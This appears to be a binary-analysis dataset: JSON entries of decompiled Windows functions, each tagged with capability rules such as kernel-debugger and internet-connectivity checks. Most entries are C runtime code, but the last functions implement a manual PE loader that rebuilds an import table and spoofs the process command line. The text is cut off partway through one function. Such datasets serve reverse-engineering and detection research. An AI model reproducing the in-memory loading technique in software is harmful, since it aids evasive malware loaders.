{
    "null": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint __cdecl method.std::bad_alloc.virtual_0(uint32_t arg_8h)\n\n{\n    uint in_ECX;\n    uint var_4h;\n    \n    fcn.004011c0();\n    if ((arg_8h & 1) != 0) {\n        fcn.00403f70(in_ECX);\n    }\n    return in_ECX;\n}\n",
        "token_count": 81
    },
    "0040bfe0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040bfe0(uint32_t *arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_e0h;\n    uint var_dch;\n    uint var_24h;\n    uint var_11h;\n    uint32_t *var_8h;\n    uint uStack8;\n    \n    puVar3 = &fcn.0040bfe0::var_24h;\n    for (iVar2 = 9; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0xcccccccc;\n        puVar3 = puVar3 + 1;\n    }\n    var_8h = arg_8h;\n    uVar1 = fcn.004117c0();\n    var_11h._0_1_ = (uVar1 & 0x7ff) == 0x7ff;\n    if ((var_11h) && ((*var_8h | var_8h[1] & 0xfffff) != 0)) {\n        fcn.004117c0();\n    }\n    uStack8 = 0x40c157;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 290
    },
    "0040c160": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c160(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_d8h;\n    uint var_d4h;\n    uint var_d0h;\n    uint var_18h;\n    uint var_8h;\n    uint uStack8;\n    \n    puVar2 = &fcn.0040c160::var_18h;\n    for (iVar1 = 6; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    var_8h = arg_8h;\n    fcn.004117c0();\n    uStack8 = 0x40c1e0;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 190
    },
    "0040c1f0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040c877)\n// WARNING: Removing unreachable block (ram,0x0040c8e1)\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.0040c1f0(uint32_t *arg_8h, char *arg_ch, uint32_t arg_10h, uint arg_14h, uint arg_18h, int32_t arg_1ch, uint arg_20h\n            , uint arg_24h, int32_t *arg_28h)\n\n{\n    code *pcVar1;\n    uchar uVar2;\n    char *pcVar3;\n    uchar *puVar4;\n    char cVar5;\n    int16_t iVar6;\n    uint *puVar7;\n    uint32_t uVar8;\n    int32_t iVar9;\n    bool bVar10;\n    ulong uVar11;\n    int64_t iVar12;\n    uint var_17ch;\n    char **var_178h;\n    uint var_bch;\n    uint32_t var_b0h;\n    int32_t var_ach;\n    char *var_a0h;\n    uint var_94h;\n    uint var_88h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_6ch;\n    char **var_60h;\n    char *var_54h;\n    uint32_t var_48h;\n    int32_t var_44h;\n    int32_t var_38h;\n    uchar *var_2ch;\n    uint uStack40;\n    int32_t var_20h;\n    uint32_t *var_14h;\n    uint32_t var_8h;\n    \n    puVar7 = &fcn.0040c1f0::var_bch;\n    for (iVar9 = 0x2f; iVar9 != 0; iVar9 = iVar9 + -1) {\n        *puVar7 = 0xcccccccc;\n        puVar7 = puVar7 + 1;\n    }\n    if (arg_1ch < 0) {\n        arg_1ch = 0;\n    }\n    *arg_ch = 0;\n    var_178h = arg_1ch + 0xbU < arg_10h;\n    var_8h = var_178h;\n    if ((var_178h == NULL) &&\n       (iVar9 = fcn.00405830(2, L\"D:\\\\a\\\\VC-LTL5\\\\VC-LTL5\\\\Sources\\\\ucrt\\\\convert\\\\cvt.cpp\", *0x419028 + 0x10, 0, \n                             0x41322c, L\"result_buffer_count > static_cast<size_t>(1 + 4 + precision + 6)\"),  iVar9 == 1\n       )) {\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    if (var_8h == 0) {\n        puVar7 = sub.msvcrt.dll__errno();\n        *puVar7 = 0x22;\n        fcn.00405a50(L\"result_buffer_count > static_cast<size_t>(1 + 4 + precision + 6)\", L\"fp_format_a\", \n                     L\"D:\\\\a\\\\VC-LTL5\\\\VC-LTL5\\\\Sources\\\\ucrt\\\\convert\\\\cvt.cpp\", *0x419028 + 0x10, 0);\n        _var_b0h = CONCAT44(var_ach, var_b0h);\n        _var_7ch = CONCAT44(var_78h, var_7ch);\n    }\n    else {\n        var_14h = arg_8h;\n        uVar8 = fcn.004117c0();\n        if ((uVar8 & 0x7ff) == 0x7ff) {\n            var_20h = fcn.0040c970(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, 0, arg_24h, 0);\n            if (var_20h == 0) {\n                var_2ch = fcn.0040d560(arg_ch, 0x65);\n                _var_b0h = CONCAT44(var_ach, var_b0h);\n                _var_7ch = CONCAT44(var_78h, var_7ch);\n                if (var_2ch != NULL) {\n                    if (arg_20h == '\\0') {\n                        uVar2 = 0x70;\n                    }\n                    else {\n                        uVar2 = 0x50;\n                    }\n                    *var_2ch = uVar2;\n                    var_2ch = var_2ch + 3;\n                    *var_2ch = 0;\n                    _var_b0h = CONCAT44(var_ach, var_b0h);\n                    _var_7ch = CONCAT44(var_78h, var_7ch);\n                }\n            }\n            else {\n                *arg_ch = 0;\n                _var_b0h = CONCAT44(var_ach, var_b0h);\n                _var_7ch = CONCAT44(var_78h, var_7ch);\n            }\n        }\n        else {\n            uVar8 = fcn.004117c0();\n            if ((uVar8 & 1) != 0) {\n                *arg_ch = 0x2d;\n                arg_ch = arg_ch + 1;\n            }\n            puVar4 = arg_ch;\n            if (arg_20h == '\\0') {\n                var_178h._3_1_ = 'a';\n            }\n            else {\n                var_178h._3_1_ = 'A';\n            }\n            var_38h = var_178h._3_1_ + -0x3a;\n            var_48h = 0x3ff;\n            var_44h = 0;\n            uVar8 = fcn.004117c0();\n            if ((uVar8 & 0x7ff) == 0) {\n                *arg_ch = 0x30;\n                if ((*var_14h | var_14h[1] & 0xfffff) == 0) {\n                    var_48h = 0;\n                    var_44h = 0;\n                }\n                else {\n                    bVar10 = var_48h == 0;\n                    var_48h = var_48h - 1;\n                    var_44h = var_44h - bVar10;\n                }\n            }\n            else {\n                *arg_ch = 0x31;\n            }\n            arg_ch = arg_ch + 1;\n            var_54h = arg_ch;\n            if (arg_1ch == 0) {\n                *arg_ch = '\\0';\n            }\n            else {\n                if (arg_28h == NULL) {\n                    var_178h = sub.msvcrt.dll_localeconv();\n                }\n                else {\n                    var_178h = *(*arg_28h + 0xbc);\n                }\n                var_60h = var_178h;\n                *var_54h = **var_178h;\n            }\n            arg_ch = puVar4 + 2;\n            if (((var_14h[1] & 0xfffff) != 0) || (_var_7ch = CONCAT44(var_78h, var_7ch),  *var_14h != 0)) {\n                var_6ch._0_2_ = 0x30;\n                var_7ch = 0xf;\n                var_78h = 0;\n                uVar11 = fcn.004117a0();\n                for (; (_var_7ch = uVar11,  -1 < var_6ch && (0 < arg_1ch)); arg_1ch = arg_1ch + -1) {\n                    iVar6 = fcn.004117c0();\n                    var_88h._0_2_ = iVar6 + 0x30;\n                    if (0x39 < var_88h) {\n                        var_88h._0_2_ = var_88h + var_38h;\n                    }\n                    *arg_ch = var_88h;\n                    arg_ch = arg_ch + 1;\n                    uVar11 = fcn.004117c0();\n                    var_6ch._0_2_ = var_6ch + -4;\n                }\n                if (-1 < var_6ch) {\n                    var_94h._0_2_ = fcn.004117c0();\n                    pcVar3 = arg_ch;\n                    if (8 < var_94h) {\n                        while ((var_a0h = pcVar3 + -1,  *var_a0h == 'f' || (*var_a0h == 'F'))) {\n                            *var_a0h = '0';\n                            pcVar3 = var_a0h;\n                        }\n                        if (var_a0h == var_54h) {\n                            var_a0h = pcVar3 + -2;\n                            *var_a0h = *var_a0h + '\\x01';\n                        }\n                        else if (*var_a0h == '9') {\n                            *var_a0h = *var_a0h + var_38h + '\\x01';\n                        }\n                        else {\n                            *var_a0h = *var_a0h + '\\x01';\n                        }\n                    }\n                }\n            }\n            for (; 0 < arg_1ch; arg_1ch = arg_1ch + -1) {\n                *arg_ch = '0';\n                arg_ch = arg_ch + 1;\n            }\n            if (*var_54h == '\\0') {\n                arg_ch = var_54h;\n            }\n            pcVar3 = arg_ch;\n            if (arg_20h == '\\0') {\n                var_178h._3_1_ = 'p';\n            }\n            else {\n                var_178h._3_1_ = 'P';\n            }\n            *arg_ch = var_178h._3_1_;\n            uVar8 = fcn.004117c0();\n            var_b0h = (uVar8 & 0x7ff) - var_48h;\n            var_ach = -((uVar8 & 0x7ff) < var_48h) - var_44h;\n            if (var_ach < 0) {\n                arg_ch[1] = '-';\n                bVar10 = var_b0h != 0;\n                var_b0h = -var_b0h;\n                var_ach = -(var_ach + bVar10);\n            }\n            else {\n                arg_ch[1] = '+';\n            }\n            arg_ch = arg_ch + 2;\n            var_54h = arg_ch;\n            *arg_ch = '0';\n            iVar12 = CONCAT44(var_ach, var_b0h);\n            if ((-1 < var_ach) && ((0 < var_ach || (iVar12 = CONCAT44(var_ach, var_b0h),  999 < var_b0h)))) {\n                cVar5 = fcn.00411630(var_b0h, var_ach, 1000, 0);\n                *arg_ch = cVar5 + '0';\n                arg_ch = pcVar3 + 3;\n                iVar12 = fcn.004116e0(var_b0h, var_ach, 1000, 0);\n            }\n            if ((arg_ch != var_54h) || (99 < iVar12)) {\n                _var_b0h = iVar12;\n                cVar5 = fcn.00411630(iVar12, 100, 0);\n                *arg_ch = cVar5 + '0';\n                arg_ch = arg_ch + 1;\n                iVar12 = fcn.004116e0(_var_b0h, 100, 0);\n            }\n            if ((arg_ch != var_54h) || (9 < iVar12)) {\n                _var_b0h = iVar12;\n                cVar5 = fcn.00411630(iVar12, 10, 0);\n                *arg_ch = cVar5 + '0';\n                arg_ch = arg_ch + 1;\n                iVar12 = fcn.004116e0(_var_b0h, 10, 0);\n            }\n            var_b0h._0_1_ = iVar12;\n            *arg_ch = var_b0h + '0';\n            arg_ch[1] = '\\0';\n            _var_b0h = iVar12;\n        }\n    }\n    uStack40 = 0x40c968;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 2757
    },
    "00410790": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.00410790(uint32_t arg_8h, uint noname_1, int32_t arg_10h, int32_t *arg_14h, int32_t arg_18h, uint arg_1ch)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    ulong uVar5;\n    uint var_109h;\n    char var_101h;\n    uint var_100h;\n    uint var_fch;\n    uint var_4ch;\n    int32_t var_34h;\n    uint var_25h;\n    uint32_t *var_1ch;\n    uint var_10h;\n    uint uStack8;\n    \n    puVar4 = &fcn.00410790::var_4ch;\n    for (iVar3 = 0x13; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0xcccccccc;\n        puVar4 = puVar4 + 1;\n    }\n    fcn.0040ee00();\n    var_1ch = &fcn.00410790::arg_8h;\n    uVar1 = fcn.004117c0();\n    if ((uVar1 & 1) == 1) {\n        var_101h = '-';\n    }\n    else {\n        var_101h = ' ';\n    }\n    *arg_14h = var_101h;\n    arg_14h[2] = arg_18h;\n    uVar1 = fcn.004117c0();\n    if (((uVar1 & 0x7ff) == 0) && ((*var_1ch | var_1ch[1] & 0xfffff) == 0)) {\n        var_109h._0_1_ = '\\x01';\n    }\n    else {\n        var_109h._0_1_ = '\\0';\n    }\n    var_25h._0_1_ = var_109h;\n    if (var_109h == '\\0') {\n        var_34h = fcn.0040bfe0(&fcn.00410790::arg_8h);\n        if (var_34h != 0) {\n            arg_14h[1] = 1;\n        }\n    // switch table (4 cases) at 0x410b44\n        switch(var_34h) {\n        case 1:\n            iVar3 = *0x419038 + 0x1c;\n            uVar2 = sub.msvcrt.dll_strcpy_s(arg_18h, arg_1ch, \"1#INF\");\n            fcn.0040da60(uVar2, L\"strcpy_s(result, result_count, \\\"1#INF\\\" )\", L\"__acrt_fltout\", \n                         L\"D:\\\\a\\\\VC-LTL5\\\\VC-LTL5\\\\Sources\\\\ucrt\\\\convert\\\\cfout.cpp\", iVar3, 0);\n            uVar5 = fcn.0040ee70();\n            break;\n        case 2:\n            iVar3 = *0x419038 + 0x1d;\n            uVar2 = sub.msvcrt.dll_strcpy_s(arg_18h, arg_1ch, \"1#QNAN\");\n            fcn.0040da60(uVar2, L\"strcpy_s(result, result_count, \\\"1#QNAN\\\")\", L\"__acrt_fltout\", \n                         L\"D:\\\\a\\\\VC-LTL5\\\\VC-LTL5\\\\Sources\\\\ucrt\\\\convert\\\\cfout.cpp\", iVar3, 0);\n            uVar5 = fcn.0040ee70();\n            break;\n        case 3:\n            iVar3 = *0x419038 + 0x1e;\n            uVar2 = sub.msvcrt.dll_strcpy_s(arg_18h, arg_1ch, \"1#SNAN\");\n            fcn.0040da60(uVar2, L\"strcpy_s(result, result_count, \\\"1#SNAN\\\")\", L\"__acrt_fltout\", \n                         L\"D:\\\\a\\\\VC-LTL5\\\\VC-LTL5\\\\Sources\\\\ucrt\\\\convert\\\\cfout.cpp\", iVar3, 0);\n            uVar5 = fcn.0040ee70();\n            break;\n        case 4:\n            iVar3 = *0x419038 + 0x1f;\n            uVar2 = sub.msvcrt.dll_strcpy_s(arg_18h, arg_1ch, \"1#IND\");\n            fcn.0040da60(uVar2, L\"strcpy_s(result, result_count, \\\"1#IND\\\" )\", L\"__acrt_fltout\", \n                         L\"D:\\\\a\\\\VC-LTL5\\\\VC-LTL5\\\\Sources\\\\ucrt\\\\convert\\\\cfout.cpp\", iVar3, 0);\n            uVar5 = fcn.0040ee70();\n            break;\n        default:\n            *var_1ch = *var_1ch;\n            var_1ch[1] = var_1ch[1] & 0x7fffffff;\n            fcn.0040e710(arg_8h, noname_1, arg_10h + 1, arg_14h + 1, arg_18h, arg_1ch);\n            uVar5 = fcn.0040ee70();\n        }\n    }\n    else {\n        arg_14h[1] = 0;\n        iVar3 = *0x419038 + 0xf;\n        uVar2 = sub.msvcrt.dll_strcpy_s(arg_18h, arg_1ch, 0x415ce0);\n        fcn.0040da60(uVar2, L\"strcpy_s(result, result_count, \\\"0\\\")\", L\"__acrt_fltout\", \n                     L\"D:\\\\a\\\\VC-LTL5\\\\VC-LTL5\\\\Sources\\\\ucrt\\\\convert\\\\cfout.cpp\", iVar3, 0);\n        uVar5 = fcn.0040ee70();\n    }\n    fcn.00411450(uVar5);\n    uStack8 = 0x410b1a;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 1367
    },
    "004014f0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004014f0(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_8h == NULL) {\n        fcn.00401580();\n    }\n    else {\n        iVar1 = *arg_8h;\n        if (*in_ECX != iVar1) {\n            if (*in_ECX != 0) {\n                fcn.00401580();\n            }\n            in_ECX[1] = *(iVar1 + 4);\n            *(iVar1 + 4) = in_ECX;\n            *in_ECX = iVar1;\n        }\n    }\n    return;\n}\n",
        "token_count": 163
    },
    "00401580": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00401580(int32_t *param_1)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint var_ch;\n    uint var_8h;\n    int32_t **var_4h;\n    \n    if (*param_1 != 0) {\n        piVar1 = *param_1;\n        while ((var_4h = piVar1 + 1,  *var_4h != NULL && (*var_4h != param_1))) {\n            piVar1 = *var_4h;\n        }\n        if (*var_4h == NULL) {\n            iVar3 = fcn.00405830(2, 0x416680, 0x4bc, 0, 0x41667c, \"ITERATOR LIST CORRUPTED!\");\n            if (iVar3 == 1) {\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n            fcn.00405a50(L\"\\\"ITERATOR LIST CORRUPTED!\\\"\", 0x4167ac, 0x4166e8, 0x4bc, 0);\n        }\n        *var_4h = param_1[1];\n        *param_1 = 0;\n    }\n    return;\n}\n",
        "token_count": 294
    },
    "00401670": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00401670(int32_t *param_1)\n\n{\n    int32_t *piVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*param_1 != 0) {\n        piVar1 = *param_1 + 4;\n        while (*piVar1 != 0) {\n            **piVar1 = 0;\n            *piVar1 = *(*piVar1 + 4);\n        }\n        *(*param_1 + 4) = 0;\n    }\n    return;\n}\n",
        "token_count": 122
    },
    "00401720": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.00401720(int16_t *arg_8h)\n\n{\n    int32_t *piVar1;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_8h == NULL) {\n        piVar1 = NULL;\n    }\n    else if (*arg_8h == 0x5a4d) {\n        if (*(arg_8h + 0x1e) < 0x401) {\n            piVar1 = arg_8h + *(arg_8h + 0x1e);\n            if (*piVar1 != 0x4550) {\n                piVar1 = NULL;\n            }\n        }\n        else {\n            piVar1 = NULL;\n        }\n    }\n    else {\n        piVar1 = NULL;\n    }\n    return piVar1;\n}\n",
        "token_count": 198
    },
    "00401790": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.00401790(uint arg_8h, uint32_t arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_ch < 0x10) {\n        iVar2 = fcn.00401720(arg_8h);\n        if (iVar2 == 0) {\n            piVar1 = NULL;\n        }\n        else {\n            piVar1 = iVar2 + 0x78 + arg_ch * 8;\n            if (*piVar1 == 0) {\n                piVar1 = NULL;\n            }\n        }\n    }\n    else {\n        piVar1 = NULL;\n    }\n    return piVar1;\n}\n",
        "token_count": 173
    },
    "00401850": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_48h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.00401850(int32_t noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6\n            , uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, \n            uint noname_13, uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint noname_18, \n            uint noname_19, uint noname_20, uint noname_21, uint noname_22, uint noname_23, uint noname_24, \n            uint noname_25, uint noname_26, uint noname_27, uint noname_28, uint noname_29, uint noname_30, \n            uint noname_31, uint noname_32, uint noname_33, uint noname_34, uint noname_35, uint noname_36, \n            uint noname_37, uint noname_38, uint noname_39, uint noname_40, uint noname_41, uint noname_42, \n            uint noname_43, uint noname_44, uint noname_45, uint noname_46, uint noname_47, uint noname_48, \n            uint noname_49, uint noname_50, uint noname_51, uint noname_52, uint noname_53, uint noname_54, \n            uint noname_55, uint noname_56, uint noname_57, uint noname_58, uint noname_59, uint noname_60, \n            uint noname_61, uint noname_62, uint noname_63, uint noname_64, uint noname_65, uint noname_66, \n            uint noname_67, uint noname_68, uint noname_69, uint noname_70, uint noname_71, uint noname_72, \n            uint noname_73, uint noname_74, uint noname_75, uint noname_76, uint noname_77, uint noname_78, \n            uint noname_79, uint noname_80, uint noname_81, uint noname_82, uint noname_83, uint noname_84, uint arg_8h)\n\n{\n    int64_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint var_44h;\n    uint var_4h_3;\n    uint var_40h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_18h;\n    uint lpString2;\n    uint var_ch;\n    uint var_4h_2;\n    uint lpCmdLine;\n    uint var_70h;\n    uint var_3ch;\n    uint var_1ch;\n    uint var_11h;\n    uint var_4h;\n    uchar *puVar3;\n    uint in_stack_fffffea8;\n    uint in_stack_fffffeac;\n    uint arg_14h;\n    uchar *puVar4;\n    uint in_stack_fffffebc;\n    uint in_stack_fffffef0;\n    uint in_stack_fffffef4;\n    uint uVar5;\n    uint in_stack_ffffff00;\n    uint in_stack_ffffff04;\n    uint var_e0h_2;\n    uint var_c4h_2;\n    uint var_c4h;\n    uint var_e0h;\n    uint var_8ch;\n    uint var_a8h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_34h_2;\n    uint var_70h_3;\n    uint var_34h;\n    uint var_30h;\n    uint var_70h_2;\n    uint32_t var_10h_2;\n    uint uStack16;\n    uint uStack12;\n    uint32_t var_4h_4;\n    uint var_48h;\n    \n    var_4h_4 = 0xffffffff;\n    uStack12 = 0x412681;\n    uStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffff0;\n    if (noname_0 != 0) {\n        fcn.00402880(noname_0);\n        var_4h_4 = 0;\n        iVar2 = fcn.00402760();\n        iVar1 = (iVar2 + 1) * 2;\n        *0x41963c = fcn.004012f0(-(iVar1 >> 0x20 != 0) | iVar1);\n        fcn.00402780();\n        (*_sym.imp.KERNEL32.dll_lstrcpyW)();\n        fcn.00402970();\n        puVar4 = &stack0xffffff00;\n        uVar5 = 0x4018eb;\n        fcn.004027a0(&stack0xffffff00);\n        puVar3 = &stack0xfffffef0;\n        fcn.004027e0(&stack0xfffffef0);\n        fcn.00402ed0(puVar3, in_stack_fffffef0, in_stack_fffffef4, uVar5, puVar4, in_stack_ffffff00, in_stack_ffffff04);\n        var_4h_4 = CONCAT31(var_4h_4._1_3_, 1);\n        iVar2 = fcn.00402760();\n        *0x419960 = fcn.004012f0(iVar2 + 1);\n        fcn.004028f0();\n        (*_sym.imp.KERNEL32.dll_lstrcpyA)();\n        (*_sym.imp.SHELL32.dll_CommandLineToArgvW)();\n        for (var_10h_2 = 0; var_10h_2 < *0x419638; var_10h_2 = var_10h_2 + 1) {\n            iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenW)();\n            iVar1 = (iVar2 + 1) * 2;\n            uVar5 = fcn.004012f0(-(iVar1 >> 0x20 != 0) | iVar1);\n            *(var_10h_2 * 4 + 0x419640) = uVar5;\n            (*_sym.imp.KERNEL32.dll_lstrcpyW)();\n            fcn.00402970();\n            fcn.00402880(*(var_10h_2 * 4 + 0x419640));\n            var_4h_4._0_1_ = 2;\n            puVar4 = &stack0xfffffebc;\n            fcn.004027a0(&stack0xfffffebc);\n            var_4h_4._0_1_ = 3;\n            uVar5 = *(var_10h_2 * 4 + 0x419640);\n            arg_14h = 0x401a2e;\n            fcn.00402880(uVar5);\n            var_4h_4._0_1_ = 4;\n            puVar3 = &stack0xfffffea8;\n            fcn.004027e0(&stack0xfffffea8);\n            var_4h_4._0_1_ = 5;\n            fcn.00402ed0(puVar3, in_stack_fffffea8, in_stack_fffffeac, arg_14h, uVar5, puVar4, in_stack_fffffebc);\n            var_4h_4._0_1_ = 7;\n            fcn.00402820();\n            var_4h_4._0_1_ = 8;\n            fcn.00402820();\n            iVar2 = fcn.00402760();\n            uVar5 = fcn.004012f0(iVar2 + 1);\n            *(var_10h_2 * 4 + 0x4197d0) = uVar5;\n            uVar5 = fcn.004028f0();\n            (*_sym.imp.KERNEL32.dll_lstrcpyA)(*(var_10h_2 * 4 + 0x4197d0), uVar5);\n            var_4h_4 = CONCAT31(var_4h_4._1_3_, 1);\n            fcn.00402910();\n        }\n        *0x419964 = 1;\n        var_4h_4 = var_4h_4 & 0xffffff00;\n        fcn.00402910();\n        var_4h_4 = 0xffffffff;\n        fcn.00402820();\n    }\n    *in_FS_OFFSET = uStack16;\n    return;\n}\n",
        "token_count": 1974
    },
    "00401b50": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_48h\n\nuint __cdecl fcn.00401b50(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    int32_t arg_ch;\n    uint uVar5;\n    code *pcVar6;\n    int32_t iVar7;\n    code **ppcVar8;\n    code **ppcVar9;\n    code *arg_ch_00;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    uint lpLibFileName;\n    int32_t var_1ch;\n    uint var_18h;\n    int32_t *var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00403c10(\"[+] Fix Import Address Table\\n\", var_48h);\n    piVar4 = fcn.00401790(arg_8h, 1);\n    if (piVar4 == NULL) {\n        uVar5 = 0;\n    }\n    else {\n        piVar1 = piVar4[1];\n        iVar2 = *piVar4;\n        for (var_14h = NULL;\n            (piVar4 = var_14h,  var_14h < piVar1 &&\n            ((piVar4 = var_14h + arg_8h + iVar2,  *piVar4 != 0 || (piVar4[4] != 0)))); var_14h = var_14h + 5) {\n            arg_ch = arg_8h + piVar4[3];\n            fcn.00403c10(\"    [+] Import DLL: %s\\n\", arg_ch);\n            iVar3 = piVar4[4];\n            var_1ch = *piVar4;\n            if (var_1ch == 0) {\n                var_1ch = piVar4[4];\n            }\n            var_24h = 0;\n            var_28h = 0;\n            while( true ) {\n                ppcVar8 = arg_8h + var_24h + iVar3;\n                ppcVar9 = arg_8h + var_28h + var_1ch;\n                if ((*ppcVar9 & 0x80000000) != 0) {\n                    uVar5 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(arg_ch, *ppcVar9 & 0xffff);\n                    pcVar6 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar5);\n                    fcn.00403c10(\"        [V] API %x at %x\\n\", *ppcVar9);\n                    *ppcVar8 = pcVar6;\n                }\n                if (*ppcVar8 == NULL) break;\n                if (*ppcVar8 == *ppcVar9) {\n                    arg_ch_00 = *ppcVar9 + arg_8h + 2;\n                    uVar5 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(arg_ch, arg_ch_00);\n                    pcVar6 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar5);\n                    fcn.00403c10(\"        [V] API %s at %x\\n\", arg_ch_00);\n                    if ((*0x419964 == '\\0') ||\n                       (iVar7 = sub.msvcrt.dll__stricmp(arg_ch_00, \"GetCommandLineA\"),  iVar7 != 0)) {\n                        if ((*0x419964 == '\\0') ||\n                           (iVar7 = sub.msvcrt.dll__stricmp(arg_ch_00, \"GetCommandLineW\"),  iVar7 != 0)) {\n                            if ((*0x419964 == '\\0') ||\n                               (iVar7 = sub.msvcrt.dll__stricmp(arg_ch_00, \"__wgetmainargs\"),  iVar7 != 0)) {\n                                if ((*0x419964 == '\\0') ||\n                                   (iVar7 = sub.msvcrt.dll__stricmp(arg_ch_00, 0x4168e0),  iVar7 != 0)) {\n                                    *ppcVar8 = pcVar6;\n                                }\n                                else {\n                                  